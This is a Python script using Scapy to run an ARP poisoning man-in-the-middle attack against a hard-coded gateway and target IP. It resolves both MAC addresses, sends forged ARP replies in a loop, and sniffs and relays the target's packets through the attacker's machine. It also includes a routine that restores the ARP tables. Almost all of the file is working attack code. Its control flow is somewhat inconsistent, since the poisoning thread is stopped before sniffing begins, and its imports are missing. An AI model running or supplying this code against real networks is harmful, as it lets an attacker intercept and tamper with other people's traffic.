
#ARP Poison parameters
gateway_ip = "198.13.13.1"
target_ip = "198.13.0.14"
packet_count = 1000
conf.iface = "eth0"
conf.verb = 0

#Given an IP, get the MAC. Broadcast ARP Request for a IP Address. Should recieve
#an ARP reply with MAC Address
def get_mac(ip_address):
    #ARP request is constructed. sr function is used to send/ receive a layer 3 packet
    #Alternative Method using Layer 2: resp, unans =  srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=ip_address))
    resp, unans = sr(ARP(op=1, hwdst="ff:ff:ff:ff:ff:ff", pdst=ip_address), retry=2, timeout=10)
    for s,r in resp:
        return r[ARP].hwsrc
    return None

#Restore the network by reversing the ARP poison attack. Broadcast ARP Reply with
#correct MAC and IP Address information
def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=gateway_ip, hwsrc=target_mac, psrc=target_ip), count=5)
    send(ARP(op=2, hwdst="ff:ff:ff:ff:ff:ff", pdst=target_ip, hwsrc=gateway_mac, psrc=gateway_ip), count=5)
    print("[*] Disabling IP forwarding")
    #Disable IP Forwarding on a mac
    # os.system("sysctl -w net.inet.ip.forwarding=0")
    #kill process on a mac
    # os.kill(os.getpid(), signal.SIGTERM)

#Keep sending false ARP replies to put our machine in the middle to intercept packets
#This will use our interface MAC address as the hwsrc for the ARP reply

def arp_poison(gateway_ip, gateway_mac, target_ip, target_mac):
    print("[*] Started ARP poison attack [CTRL-C to stop]")
    global arp_poison_continue
    try:
        while arp_poison_continue:
            send(ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip))
            send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip))
            time.sleep(2)
    except KeyboardInterrupt:
        print("[*] Stopped ARP poison attack. Restoring network")
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
    print("[*] Stopped ARP poison attack. Restoring network")
    restore_network(gateway_ip, gateway_mac, target_ip, target_mac)

#Start the script#######################################

################  START ###############


arp_poison_continue = True;




gateway_mac = get_mac(gateway_ip)


target_mac = get_mac(target_ip)


### to start poisoning
arp_poison_continue = True 
poison_thread = threading.Thread(target=arp_poison, args=(gateway_ip, gateway_mac, target_ip, target_mac))
poison_thread.start()


### to stop poisoning
arp_poison_continue = False  
poison_thread.join() 




def pkt_callback(pkt):
    global target_mac
    global gateway_mac
    my_mac = '02:42:c6:0d:00:0f'
    print(my_mac + ' = my_mac')
    print(target_mac + ' = target_mac')
    print(gateway_mac + ' = gateway_mac')
    print("something new from " + pkt.src)
    # dns_pck = pkt.find('DNS')
    # query_pck = dns_pck.find('DNS Question Record')
    # print(query_pck.qname)
    if pkt.src == gateway_mac:
        pkt.show() # debug statement
        print("from gateway")
        pkt.dst = target_mac
        pkt.src = my_mac
        print(pkt.dst)
        send(pkt)
    elif pkt.src == target_mac:
        pkt.show() # debug statement
        print("from target")
        pkt.dst = gateway_mac
        pkt.src = my_mac 
        print(pkt.dst)
        sendp(pkt)
    else:
        print("from" + pkt.src)

sniff_filter = "ip host " + target_ip
sniff(iface=conf.iface, prn=pkt_callback, filter=sniff_filter)












### to stop poisoning
arp_poison_continue = False  
poison_thread.join() 
sys.exit(0)